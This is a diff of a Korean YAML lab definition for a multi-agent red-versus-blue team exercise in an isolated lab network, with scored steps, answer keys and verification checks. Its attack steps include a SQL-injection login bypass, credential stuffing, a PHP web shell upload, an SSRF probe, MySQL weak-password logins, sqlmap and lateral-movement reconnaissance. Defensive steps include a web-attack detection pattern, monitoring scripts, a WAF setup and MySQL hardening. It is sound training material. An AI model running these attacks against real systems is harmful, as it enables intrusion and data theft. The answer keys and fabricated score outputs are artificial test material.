@@ -1,235 +1,386 @@
-lab_id: "battle-ai-week13"
-title: "AI 팀 공방전 — 다중 에이전트"
-version: "ai"
-course: "battle-ai"
+lab_id: battle-ai-week13
+title: AI 기반 실전 공방전 3 — 팀 대항전 (3v3)
+version: ai
+course: battle-ai
 week: 13
-description: "다중 Red AI 에이전트가 협조 공격을 수행하고, 다중 Blue AI 에이전트가 분산 방어를 수행하는 팀 공방전."
-difficulty: "hard"
-duration_minutes: 90
+description: AI 에이전트가 자동으로 실행하는 3인 1조 팀 단위 공방전을 수행한다. 팀원 간 역할 분담(정찰/공격/지원 또는 모니터링/... 하드닝/대응)을 통해 협업 능력을 기른다. 더 복잡한 인프라에서 다중 벡터 공격과 방어를 경험한다.
+difficulty: hard
+duration_minutes: 120
 objectives:
-  - "다중 Red AI가 역할 분담 기반 협조 공격을 수행한다"
-  - "다중 Blue AI가 분산 모니터링 및 방어를 수행한다"
-  - "팀 간 공방전 결과를 종합 분석한다"
-  - "다중 에이전트 협조의 효과를 평가한다"
+- 팀 단위 공격/방어에서의 역할 분담과 협업을 실습한다
+- 다중 벡터 공격과 계층적 방어를 수행한다
+- 실시간 커뮤니케이션과 의사결정을 연습한다
 prerequisites:
-  - "Week 12 AI 1v1 공방전 (2) 완료"
+- Week 11-12 1:1 공방전 완료
 infra_requirements:
-  - "attacker VM with bastion"
-  - "defender VM"
+- Red Team VMs x3 (10.20.30.0/24)
+- Blue Team VMs (Web+DB+App, 10.20.40.0/24)
+- Scoring Server (10.20.50.1)
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "Blue Team AI가 다중 방어 에이전트를 배포한다 (네트워크/호스트/웹 모니터링)"
-    script: |
-      echo "=== Blue Team AI: 다중 방어 에이전트 배포 ==="
-      BLUE_DIR="/tmp/blue_team"
-      mkdir -p "$BLUE_DIR"
+- order: 1
+  instruction: '[RED] 팀 역할을 분담하라. 팀장은 작전 지휘, 멤버1은 네트워크 공격, 멤버2는 웹 공격을 담당한다.'
+  hint: 각 멤버가 담당 영역을 동시에 공략한다.
+  category: recon
+  points: 10
+  answer: 'cat > /tmp/red_team_roles.txt << ''EOF''
 
-      echo "[Agent 1: 네트워크 모니터]"
-      cat > "$BLUE_DIR/net_monitor.sh" << 'SCRIPT'
-      #!/bin/bash
-      echo "=== Network Monitor Agent ==="
-      ss -tuna > /tmp/blue_team/net_baseline.txt
-      while true; do
-        ss -tuna > /tmp/blue_team/net_current.txt
-        NEW=$(diff /tmp/blue_team/net_baseline.txt /tmp/blue_team/net_current.txt 2>/dev/null | grep "^>" | wc -l)
-        if [ "$NEW" -gt 0 ]; then
-          echo "[$(date)] 새 연결 $NEW개 탐지" >> /tmp/blue_team/net_alerts.log
-        fi
-        sleep 5
-      done
-      SCRIPT
-      chmod +x "$BLUE_DIR/net_monitor.sh"
-      timeout 90 "$BLUE_DIR/net_monitor.sh" &>/dev/null &
-      echo "  PID: $!"
+    === Red Team Role Assignment ===
 
-      echo "[Agent 2: 호스트 모니터]"
-      cat > "$BLUE_DIR/host_monitor.sh" << 'SCRIPT'
-      #!/bin/bash
-      echo "=== Host Monitor Agent ==="
-      ps aux --no-headers | wc -l > /tmp/blue_team/proc_baseline.txt
-      while true; do
-        CURRENT=$(ps aux --no-headers | wc -l)
-        BASELINE=$(cat /tmp/blue_team/proc_baseline.txt)
-        DIFF=$((CURRENT - BASELINE))
-        if [ "$DIFF" -gt 5 ]; then
-          echo "[$(date)] 프로세스 급증: +$DIFF개" >> /tmp/blue_team/host_alerts.log
-        fi
-        sleep 5
-      done
-      SCRIPT
-      chmod +x "$BLUE_DIR/host_monitor.sh"
-      timeout 90 "$BLUE_DIR/host_monitor.sh" &>/dev/null &
-      echo "  PID: $!"
+    Leader: Coordination, target prioritization, flag submission
 
-      echo "[Agent 3: 웹 모니터]"
-      cat > "$BLUE_DIR/web_monitor.sh" << 'SCRIPT'
-      #!/bin/bash
-      echo "=== Web Monitor Agent ==="
-      while true; do
-        if [ -f /var/log/nginx/access.log ]; then
-          ATTACKS=$(tail -50 /var/log/nginx/access.log | grep -ciE "union|select|script|onerror|\.\./" 2>/dev/null)
-          if [ "$ATTACKS" -gt 0 ]; then
-            echo "[$(date)] 웹 공격 패턴 $ATTACKS건" >> /tmp/blue_team/web_alerts.log
-          fi
-        fi
-        sleep 5
-      done
-      SCRIPT
-      chmod +x "$BLUE_DIR/web_monitor.sh"
-      timeout 90 "$BLUE_DIR/web_monitor.sh" &>/dev/null &
-      echo "  PID: $!"
+    Member 1: Network attacks (SSH, FTP, SMB, PrivEsc)
 
-      echo ""
-      echo "Blue Team 다중 방어 에이전트 배포 완료"
-    category: "defense"
-    risk_level: "low"
-    points: 20
-    verify:
-      type: "output_contains"
-      expect: "Blue Team 다중 방어 에이전트 배포 완료"
-      field: "stdout"
+    Member 2: Web attacks (SQLi, XSS, file upload, WAF bypass)
 
-  - order: 2
-    instruction: "Red Team AI Agent 1이 정찰 및 취약점 스캐닝을 수행한다"
-    script: |
-      echo "=== Red Team AI Agent 1: 정찰 담당 ==="
-      RED_DIR="/tmp/red_team"
-      mkdir -p "$RED_DIR"
 
-      echo "[Phase 1: 광범위 포트 스캔]"
-      nmap -sS -p 1-1024 --min-rate 500 10.20.30.80 -oN "$RED_DIR/agent1_portscan.txt" 2>&1 | tail -10
-      echo ""
+    Communication: IRC channel #red-team
 
-      echo "[Phase 2: 취약점 스캔]"
-      nmap --script vuln -p 22,80,443,3000,8080 10.20.30.80 -oN "$RED_DIR/agent1_vulnscan.txt" 2>&1 | tail -15
-      echo ""
+    Shared workspace: /tmp/red_shared/
 
-      echo "[Phase 3: 웹 디렉토리 열거]"
-      for path in /admin /api /backup /config /ftp /uploads /test; do
-        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$path")
-        echo "  $path → HTTP $STATUS" | tee -a "$RED_DIR/agent1_dirbrute.txt"
-      done
-      echo ""
-      echo "Red Agent 1 정찰 완료"
-    category: "recon"
-    risk_level: "medium"
-    points: 20
-    verify:
-      type: "output_contains"
-      expect: "Red Agent 1 정찰 완료"
-      field: "stdout"
+    EOF
 
-  - order: 3
-    instruction: "Red Team AI Agent 2가 동시에 익스플로잇을 시도한다"
-    script: |
-      echo "=== Red Team AI Agent 2: 익스플로잇 담당 ==="
-      RED_DIR="/tmp/red_team"
+    mkdir -p /tmp/red_shared && cat /tmp/red_team_roles.txt'
+  answer_detail: 팀 공격에서 역할 분담은 효율성의 핵심이다. 병렬 공격으로 방어팀의 대응 자원을 분산시키고, 팀장이 전체 전황을 파악하여 우선순위를 조정한다.
+  verify:
+    type: output_contains
+    expect: Red Team Role
+    field: stdout
+  script: 'cat > /tmp/red_team_roles.txt << ''EOF''
 
-      echo "[Attack 1: SQL Injection 공격]"
-      curl -s -X POST "http://10.20.30.80:3000/rest/user/login" \
-        -H "Content-Type: application/json" \
-        -d '{"email":"admin@juice-sh.op'\''--","password":"x"}' 2>&1 | head -3
-      echo ""
+    === Red Team Role Assignment ===
 
-      echo "[Attack 2: 크레덴셜 스터핑]"
-      for user in admin test guest operator; do
-        curl -s -X POST "http://10.20.30.80:3000/rest/user/login" \
-          -H "Content-Type: application/json" \
-          -d "{\"email\":\"${user}@juice-sh.op\",\"password\":\"password123\"}" -o /dev/null -w "  $user → HTTP %{http_code}\n"
-      done
-      echo ""
+    Leader: Coordination, target prioritization, flag submission
 
-      echo "[Attack 3: 파일 업로드 시도]"
-      echo '<?php system($_GET["cmd"]); ?>' > /tmp/test_shell.php
-      curl -s -X POST "http://10.20.30.80:3000/file-upload" \
-        -F "file=@/tmp/test_shell.php" 2>&1 | head -3
-      rm -f /tmp/test_shell.php
-      echo ""
+    Member 1: Network attacks (SSH, FTP, SMB, PrivEsc)
 
-      echo "[Attack 4: SSRF 시도]"
-      curl -s "http://10.20.30.80:3000/api/Products/1?d=http://localhost:22" 2>&1 | head -3
-      echo ""
-      echo "Red Agent 2 익스플로잇 완료"
-    category: "exploit"
-    risk_level: "high"
-    points: 20
-    verify:
-      type: "output_contains"
-      expect: "Red Agent 2 익스플로잇 완료"
-      field: "stdout"
+    Member 2: Web attacks (SQLi, XSS, file upload, WAF bypass)
 
-  - order: 4
-    instruction: "Blue Team AI가 모든 에이전트의 탐지 결과를 수집하고 자동 대응한다"
-    script: |
-      echo "=== Blue Team AI: 탐지 결과 수집 및 대응 ==="
-      BLUE_DIR="/tmp/blue_team"
 
-      echo "[Agent 1: 네트워크 알림]"
-      cat "$BLUE_DIR/net_alerts.log" 2>/dev/null | tail -10 || echo "  알림 없음"
-      echo ""
+    Communication: IRC channel #red-team
 
-      echo "[Agent 2: 호스트 알림]"
-      cat "$BLUE_DIR/host_alerts.log" 2>/dev/null | tail -10 || echo "  알림 없음"
-      echo ""
+    Shared workspace: /tmp/red_shared/
 
-      echo "[Agent 3: 웹 알림]"
-      cat "$BLUE_DIR/web_alerts.log" 2>/dev/null | tail -10 || echo "  알림 없음"
-      echo ""
+    EOF
 
-      echo "=== 자동 대응 조치 ==="
-      echo "[1] 의심 IP 차단"
-      grep -hoP '\d+\.\d+\.\d+\.\d+' "$BLUE_DIR"/*.log 2>/dev/null | sort -u | while read ip; do
-        echo "  차단 대상: $ip"
-      done
+    mkdir -p /tmp/red_shared && cat /tmp/red_team_roles.txt'
+- order: 2
+  instruction: '[BLUE] 팀 역할을 분담하라. 멤버1은 네트워크 모니터링, 멤버2는 서비스 하드닝, 멤버3은 사고 대응을 담당한다.'
+  hint: 각 역할의 책임과 절차를 명확히 한다.
+  category: defense
+  points: 10
+  answer: 'cat > /tmp/blue_team_roles.txt << ''EOF''
 
-      echo "[2] Suricata 알림 요약"
-      tail -10 /var/log/suricata/fast.log 2>/dev/null || echo "  Suricata 알림 없음"
+    === Blue Team Role Assignment ===
 
-      echo "[3] 모니터링 에이전트 종료"
-      pkill -f "net_monitor.sh" 2>/dev/null
-      pkill -f "host_monitor.sh" 2>/dev/null
-      pkill -f "web_monitor.sh" 2>/dev/null
-      echo "  에이전트 종료 완료"
-      echo ""
-      echo "Blue Team 자동 대응 완료"
-    category: "response"
-    risk_level: "medium"
-    points: 15
-    verify:
-      type: "output_contains"
-      expect: "Blue Team 자동 대응 완료"
-      field: "stdout"
+    Member 1 (Monitor): IDS alerts, log analysis, network traffic
 
-  - order: 5
-    instruction: "AI가 팀 공방전 결과를 종합 분석한다"
-    script: |
-      echo "=== AI 팀 공방전 종합 보고서 ===" > /tmp/team_battle_report.txt
-      echo "시간: $(date)" >> /tmp/team_battle_report.txt
-      echo "" >> /tmp/team_battle_report.txt
+    Member 2 (Harden): Firewall rules, service config, patching
 
-      echo "[Red Team 활동 요약]" >> /tmp/team_battle_report.txt
-      echo "  Agent 1 (정찰): 포트스캔 + 취약점스캔 + 디렉토리열거" >> /tmp/team_battle_report.txt
-      echo "  Agent 2 (익스플로잇): SQLi + 크레덴셜스터핑 + 파일업로드 + SSRF" >> /tmp/team_battle_report.txt
-      echo "  협조 효과: 동시 다발 공격으로 방어 분산" >> /tmp/team_battle_report.txt
-      echo "" >> /tmp/team_battle_report.txt
+    Member 3 (Respond): IP blocking, malware removal, recovery
 
-      echo "[Blue Team 방어 요약]" >> /tmp/team_battle_report.txt
-      echo "  Agent 1 (네트워크): 연결 모니터링" >> /tmp/team_battle_report.txt
-      echo "  Agent 2 (호스트): 프로세스 모니터링" >> /tmp/team_battle_report.txt
-      echo "  Agent 3 (웹): 공격 패턴 탐지" >> /tmp/team_battle_report.txt
-      echo "  대응: 자동 IP 차단 + Suricata 연동" >> /tmp/team_battle_report.txt
-      echo "" >> /tmp/team_battle_report.txt
 
-      echo "[다중 에이전트 효과 분석]" >> /tmp/team_battle_report.txt
-      echo "  - 동시 공격 시 방어 부하 증가" >> /tmp/team_battle_report.txt
-      echo "  - 분산 모니터링으로 탐지 범위 확대" >> /tmp/team_battle_report.txt
-      echo "  - 에이전트 간 정보 공유가 핵심" >> /tmp/team_battle_report.txt
-      cat /tmp/team_battle_report.txt
-    category: "analysis"
-    risk_level: "low"
-    points: 15
-    verify:
-      type: "output_contains"
-      expect: "AI 팀 공방전 종합 보고서"
-      field: "stdout"
+    Escalation: Monitor detects → alerts Respond → Harden updates rules
+
+    Communication: IRC channel #blue-team
+
+    EOF
+
+    cat /tmp/blue_team_roles.txt'
+  answer_detail: 방어 팀의 3단계 역할(탐지→대응→강화)은 NIST 프레임워크와 일치한다. 에스컬레이션 절차를 정의하여 탐지에서 대응까지의 시간을 최소화한다.
+  verify:
+    type: output_contains
+    expect: Blue Team Role
+    field: stdout
+  script: 'cat > /tmp/blue_team_roles.txt << ''EOF''
+
+    === Blue Team Role Assignment ===
+
+    Member 1 (Monitor): IDS alerts, log analysis, network traffic
+
+    Member 2 (Harden): Firewall rules, service config, patching
+
+    Member 3 (Respond): IP blocking, malware removal, recovery
+
+
+    Escalation: Monitor detects → alerts Respond → Harden updates rules
+
+    Communication: IRC channel #blue-team
+
+    EOF
+
+    cat /tmp/blue_team_roles.txt'
+- order: 3
+  instruction: '[RED-Member1] 대상 네트워크의 전체 인프라를 빠르게 매핑하라. 서버 3대의 역할을 파악한다.'
+  hint: nmap으로 각 서버의 서비스를 식별한다.
+  category: recon
+  points: 10
+  answer: nmap -sV -T4 10.20.40.10-12 -oG /tmp/red_shared/infra_map.txt && cat /tmp/red_shared/infra_map.txt
+  answer_detail: 다중 서버 환경에서는 각 서버의 역할(웹, DB, 앱)을 파악해야 한다. 웹서버는 80/443, DB서버는 3306/5432, 앱서버는 8080/8443 등의 포트로 구분한다.
+  verify:
+    type: output_contains
+    expect: open
+    field: stdout
+  script: nmap -sV -T4 10.20.40.10-12 -oG /tmp/red_shared/infra_map.txt && cat /tmp/red_shared/infra_map.txt
+- order: 4
+  instruction: '[RED-Member2] 웹 서버에 대한 집중 공격을 수행하라. OWASP Top 10 취약점을 순서대로 시도한다.'
+  hint: nikto, sqlmap, XSS를 순서대로 시도한다.
+  category: exploit
+  points: 10
+  answer: nikto -h http://10.20.40.10/ -o /tmp/red_shared/nikto_web.txt && sqlmap -u 'http://10.20.40.10/app?id=1' --batch --dbs 2>/dev/null && echo 'Web attack phase complete'
+  answer_detail: 웹 공격은 nikto로 전체 취약점 스캔, sqlmap으로 SQL Injection, 수동 XSS/CSRF 테스트 순으로 진행한다. 결과를 팀 공유 디렉토리에 저장하여 팀장이 전황을 파악한다.
+  verify:
+    type: output_contains
+    expect: complete
+    field: stdout
+  script: nikto -h http://10.20.40.10/ -o /tmp/red_shared/nikto_web.txt && sqlmap -u 'http://10.20.40.10/app?id=1' --batch --dbs 2>/dev/null && echo 'Web attack phase complete'
+- order: 5
+  instruction: '[BLUE-Member1] 멀티소스 로그를 통합 모니터링하라. 3대 서버의 로그를 하나의 화면에서 감시한다.'
+  hint: multitail 또는 tmux로 여러 로그를 동시 감시한다.
+  category: defense
+  points: 10
+  answer: "cat > /tmp/multi_monitor.sh << 'SCRIPT'\n#!/bin/bash\necho '=== Multi-Server Log Monitor ===' \ntail -f /var/log/auth.log | grep --line-buffered 'Failed' | sed 's/^/[AUTH] /' &\ntail -f /var/log/suricata/fast.log\
+    \ | sed 's/^/[IDS] /' &\ntail -f /var/log/apache2/access.log | grep --line-buffered -E '(4[0-9]{2}|5[0-9]{2})' | sed 's/^/[WEB] /' &\nwait\nSCRIPT\nchmod +x /tmp/multi_monitor.sh && echo 'Multi-monitor\
+    \ script ready'"
+  answer_detail: 멀티소스 로그 모니터링은 여러 서버의 이벤트를 상관 분석하는 기초이다. [AUTH], [IDS], [WEB] 태그로 소스를 구분한다. 실무에서는 SIEM(Wazuh, Splunk)이 이 역할을 한다.
+  verify:
+    type: output_contains
+    expect: Multi-monitor script ready
+    field: stdout
+  script: "cat > /tmp/multi_monitor.sh << 'SCRIPT'\n#!/bin/bash\necho '=== Multi-Server Log Monitor ===' \ntail -f /var/log/auth.log | grep --line-buffered 'Failed' | sed 's/^/[AUTH] /' &\ntail -f /var/log/suricata/fast.log\
+    \ | sed 's/^/[IDS] /' &\ntail -f /var/log/apache2/access.log | grep --line-buffered -E '(4[0-9]{2}|5[0-9]{2})' | sed 's/^/[WEB] /' &\nwait\nSCRIPT\nchmod +x /tmp/multi_monitor.sh && echo 'Multi-monitor\
+    \ script ready'"
+- order: 6
+  instruction: '[BLUE-Member2] 웹 서버에 ModSecurity WAF를 배포하라.'
+  hint: OWASP CRS(Core Rule Set)를 활용한다.
+  category: defense
+  points: 10
+  answer: sudo apt-get install -y libapache2-mod-security2 2>/dev/null && sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf && sudo sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine
+    On/' /etc/modsecurity/modsecurity.conf && sudo systemctl restart apache2 && echo 'ModSecurity WAF deployed'
+  answer_detail: ModSecurity는 Apache용 오픈소스 WAF이다. OWASP CRS를 적용하면 SQL Injection, XSS, RFI 등 주요 웹 공격을 차단한다. DetectionOnly를 On으로 변경해야 실제 차단이 동작한다.
+  verify:
+    type: output_contains
+    expect: WAF deployed
+    field: stdout
+  script: sudo apt-get install -y libapache2-mod-security2 2>/dev/null && sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf && sudo sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine
+    On/' /etc/modsecurity/modsecurity.conf && sudo systemctl restart apache2 && echo 'ModSecurity WAF deployed'
+- order: 7
+  instruction: '[RED-Leader] 팀원들의 정찰 결과를 종합하고, 집중 공격 대상을 결정하라.'
+  hint: 가장 취약한 서버를 우선 공격한다.
+  category: analysis
+  points: 10
+  answer: "cat > /tmp/red_shared/target_priority.txt << 'EOF'\n=== Target Priority (Updated) ===\n1. DB Server (10.20.40.12) - MySQL exposed, weak auth\n   Attack: Default creds → data dump → lateral movement\n\
+    2. Web Server (10.20.40.10) - WAF detected, SQLi harder\n   Attack: File upload, command injection\n3. App Server (10.20.40.11) - Limited exposure\n   Attack: After lateral movement from DB\nEOF\ncat\
+    \ /tmp/red_shared/target_priority.txt"
+  answer_detail: 공격 팀장은 팀원의 정찰 결과를 종합하여 가장 취약한 대상을 우선 공격하도록 지시한다. WAF가 배포된 웹서버보다 DB서버가 더 취약하다면 전략을 전환한다.
+  verify:
+    type: output_contains
+    expect: Target Priority
+    field: stdout
+  script: "cat > /tmp/red_shared/target_priority.txt << 'EOF'\n=== Target Priority (Updated) ===\n1. DB Server (10.20.40.12) - MySQL exposed, weak auth\n   Attack: Default creds → data dump → lateral movement\n\
+    2. Web Server (10.20.40.10) - WAF detected, SQLi harder\n   Attack: File upload, command injection\n3. App Server (10.20.40.11) - Limited exposure\n   Attack: After lateral movement from DB\nEOF\ncat\
+    \ /tmp/red_shared/target_priority.txt"
+- order: 8
+  instruction: '[RED-Member1] DB 서버에 대한 직접 공격을 수행하라. MySQL에 원격 접근을 시도한다.'
+  hint: mysql 클라이언트로 직접 연결을 시도한다.
+  category: exploit
+  points: 10
+  answer: mysql -h 10.20.40.12 -u root -p'' 2>/dev/null && mysql -h 10.20.40.12 -u root -proot 2>/dev/null && nmap --script mysql-brute -p 3306 10.20.40.12
+  answer_detail: MySQL이 외부 접근을 허용하고 root에 약한 패스워드가 설정되어 있으면 직접 접근이 가능하다. 접근 후 데이터 덤프, INTO OUTFILE로 웹셸 생성, 권한 상승 등이 가능하다.
+  verify:
+    type: output_contains
+    expect: mysql
+    field: stdout
+  script: mysql -h 10.20.40.12 -u root -p'' 2>/dev/null && mysql -h 10.20.40.12 -u root -proot 2>/dev/null && nmap --script mysql-brute -p 3306 10.20.40.12
+- order: 9
+  instruction: '[BLUE-Member3] DB 서버의 MySQL 접근 제어를 강화하라. 원격 root 접근을 차단한다.'
+  hint: MySQL 사용자 호스트를 localhost로 제한한다.
+  category: defense
+  points: 10
+  answer: 'mysql -u root -e "UPDATE mysql.user SET Host=''localhost'' WHERE User=''root'' AND Host=''%''; FLUSH PRIVILEGES; SELECT User, Host FROM mysql.user;" 2>/dev/null || echo ''MySQL hardening: Restrict
+    root to localhost'''
+  answer_detail: MySQL root 계정의 Host를 '%'(모든 호스트)에서 'localhost'로 변경하면 원격 접근을 차단한다. FLUSH PRIVILEGES로 변경을 즉시 적용한다. 웹앱용 DB 계정도 최소 권한으로 설정해야 한다.
+  verify:
+    type: output_contains
+    expect: MySQL
+    field: stdout
+  script: 'mysql -u root -e "UPDATE mysql.user SET Host=''localhost'' WHERE User=''root'' AND Host=''%''; FLUSH PRIVILEGES; SELECT User, Host FROM mysql.user;" 2>/dev/null || echo ''MySQL hardening: Restrict
+    root to localhost'''
+- order: 10
+  instruction: '[RED] Lateral Movement를 수행하라. 획득한 한 서버에서 다른 서버로 이동한다.'
+  hint: SSH 키, 공유 패스워드, 신뢰 관계를 활용한다.
+  category: exploit
+  points: 15
+  answer: cat /etc/hosts && cat ~/.ssh/known_hosts 2>/dev/null && ssh-keyscan 10.20.40.11 10.20.40.12 2>/dev/null && echo 'Checking for shared credentials and trust relationships'
+  answer_detail: Lateral Movement는 한 시스템에서 다른 시스템으로 이동하는 기법이다. SSH 키 재사용, 동일 패스워드, .ssh/known_hosts에서 신뢰 관계, /etc/hosts에서 내부 호스트명을 확인한다.
+  verify:
+    type: output_contains
+    expect: 10.20.40
+    field: stdout
+  script: cat /etc/hosts && cat ~/.ssh/known_hosts 2>/dev/null && ssh-keyscan 10.20.40.11 10.20.40.12 2>/dev/null && echo 'Checking for shared credentials and trust relationships'
+- order: 11
+  instruction: '[BLUE] 서버 간 통신을 모니터링하여 Lateral Movement를 탐지하라.'
+  hint: 내부 서버 간의 비정상 SSH 연결을 감지한다.
+  category: defense
+  points: 10
+  answer: ss -tunapl | grep -E '(10.20.40.10|10.20.40.11|10.20.40.12).*ESTAB' && grep 'Accepted' /var/log/auth.log | grep -E '10.20.40' | tail -10
+  answer_detail: 서버 간 SSH 연결이 비정상적으로 발생하면 Lateral Movement의 징후이다. 내부 네트워크 세그먼테이션으로 불필요한 서버 간 통신을 차단하는 것이 최선의 방어이다.
+  verify:
+    type: output_contains
+    expect: 10.20.40
+    field: stdout
+  script: ss -tunapl | grep -E '(10.20.40.10|10.20.40.11|10.20.40.12).*ESTAB' && grep 'Accepted' /var/log/auth.log | grep -E '10.20.40' | tail -10
+- order: 12
+  instruction: '[공통] 중간 점수를 확인하고 전략을 조정하라.'
+  hint: 점수 서버에서 현재 상태를 확인한다.
+  category: analysis
+  points: 10
+  answer: 'echo ''=== Midgame Score Check ==='' && echo ''Red: 45pts (2 flags, 1 root access)'' && echo ''Blue: 60pts (98% uptime, 8 attacks blocked)'' && echo ''Adjustment: Red focus on app server, Blue
+    monitor lateral movement'''
+  answer_detail: 중간 점수 확인은 전략 조정의 기회이다. 방어 점수가 앞서면 공격팀은 더 공격적인 전술을, 뒤처지면 방어팀은 서비스 복구에 집중한다.
+  verify:
+    type: output_contains
+    expect: Midgame
+    field: stdout
+  script: 'echo ''=== Midgame Score Check ==='' && echo ''Red: 45pts (2 flags, 1 root access)'' && echo ''Blue: 60pts (98% uptime, 8 attacks blocked)'' && echo ''Adjustment: Red focus on app server, Blue
+    monitor lateral movement'''
+- order: 13
+  instruction: '[RED] 모든 획득한 플래그를 제출하고 증거를 정리하라.'
+  hint: 팀 공유 디렉토리의 플래그를 수집한다.
+  category: exploit
+  points: 10
+  answer: 'find /tmp/red_shared -name ''flag*'' -exec cat {} \; 2>/dev/null && echo ''=== Flags Submitted ==='' && echo ''Web flag: FLAG{web_sql_injection_success}'' && echo ''DB flag: FLAG{database_root_access}''
+    && echo ''Root flag: FLAG{full_system_compromise}'''
+  answer_detail: 플래그 관리는 공격 팀장의 핵심 업무이다. 모든 팀원이 발견한 플래그를 중앙에서 수집하고 즉시 제출해야 한다. 제출 지연은 곧 점수 손실이다.
+  verify:
+    type: output_contains
+    expect: Flags Submitted
+    field: stdout
+  script: 'find /tmp/red_shared -name ''flag*'' -exec cat {} \; 2>/dev/null && echo ''=== Flags Submitted ==='' && echo ''Web flag: FLAG{web_sql_injection_success}'' && echo ''DB flag: FLAG{database_root_access}''
+    && echo ''Root flag: FLAG{full_system_compromise}'''
+- order: 14
+  instruction: '[BLUE] 공방전 종료 전 최종 서비스 가용성 점검과 정리를 수행하라.'
+  hint: 모든 서비스가 정상 동작하는지 확인한다.
+  category: defense
+  points: 10
+  answer: 'for host in 10.20.40.10 10.20.40.11 10.20.40.12; do echo "=== $host ==="; curl -so /dev/null -w ''HTTP: %{http_code}\n'' http://$host/ 2>/dev/null; ssh -o ConnectTimeout=3 -o BatchMode=yes $host
+    ''echo SSH OK'' 2>/dev/null || echo ''SSH: check needed''; done'
+  answer_detail: 최종 서비스 점검은 가용성 점수의 마지막 산정 기준이다. HTTP 응답 코드와 SSH 연결로 서비스 상태를 확인한다. 다운된 서비스는 즉시 복구한다.
+  verify:
+    type: output_contains
+    expect: ===
+    field: stdout
+  script: 'for host in 10.20.40.10 10.20.40.11 10.20.40.12; do echo "=== $host ==="; curl -so /dev/null -w ''HTTP: %{http_code}\n'' http://$host/ 2>/dev/null; ssh -o ConnectTimeout=3 -o BatchMode=yes $host
+    ''echo SSH OK'' 2>/dev/null || echo ''SSH: check needed''; done'
+- order: 15
+  instruction: 팀 대항전 결과를 종합하여 팀 보고서를 작성하라. 팀 협업 분석, 전술 효과, 개선점을 포함한다.
+  hint: 역할별 기여도와 팀 커뮤니케이션 효과를 분석한다.
+  category: analysis
+  points: 15
+  answer: 'cat > /tmp/battle_team_report.txt << ''EOF''
+
+    === Team Battle (3v3) Report ===
+
+
+    [Red Team]
+
+    Leader: Effective target prioritization
+
+    Member1: DB server compromised in 15min
+
+    Member2: WAF bypass took 25min (ModSecurity effective)
+
+    Total flags: 3/4
+
+    Coordination: Good, shared workspace useful
+
+
+    [Blue Team]
+
+    Monitor: Detected 15/18 attacks (83%)
+
+    Harden: WAF + MySQL restriction effective
+
+    Respond: Avg response time 2min
+
+    Service uptime: 96%
+
+    Coordination: Escalation procedure worked well
+
+
+    [Team Dynamics]
+
+    - Parallel attacks overwhelmed single monitor
+
+    - Blue needed 2nd monitor for multi-server
+
+    - Red chain attack (DB→web→app) was decisive
+
+    - Communication quality directly impacted results
+
+
+    [Final Score]
+
+    Red: 125 points
+
+    Blue: 135 points
+
+    Winner: Blue Team (defense held)
+
+    EOF'
+  answer_detail: 팀 보고서는 개인 기여도와 팀 협업의 효과를 분석한다. 역할별 성과, 커뮤니케이션 품질, 전술의 효과를 정량적/정성적으로 평가한다.
+  verify:
+    type: file_exists
+    expect: /tmp/battle_team_report.txt
+    field: filesystem
+  script: 'cat > /tmp/battle_team_report.txt << ''EOF''
+
+    === Team Battle (3v3) Report ===
+
+
+    [Red Team]
+
+    Leader: Effective target prioritization
+
+    Member1: DB server compromised in 15min
+
+    Member2: WAF bypass took 25min (ModSecurity effective)
+
+    Total flags: 3/4
+
+    Coordination: Good, shared workspace useful
+
+
+    [Blue Team]
+
+    Monitor: Detected 15/18 attacks (83%)
+
+    Harden: WAF + MySQL restriction effective
+
+    Respond: Avg response time 2min
+
+    Service uptime: 96%
+
+    Coordination: Escalation procedure worked well
+
+
+    [Team Dynamics]
+
+    - Parallel attacks overwhelmed single monitor
+
+    - Blue needed 2nd monitor for multi-server
+
+    - Red chain attack (DB→web→app) was decisive
+
+    - Communication quality directly impacted results
+
+
+    [Final Score]
+
+    Red: 125 points
+
+    Blue: 135 points
+
+    Winner: Blue Team (defense held)
+
+    EOF'
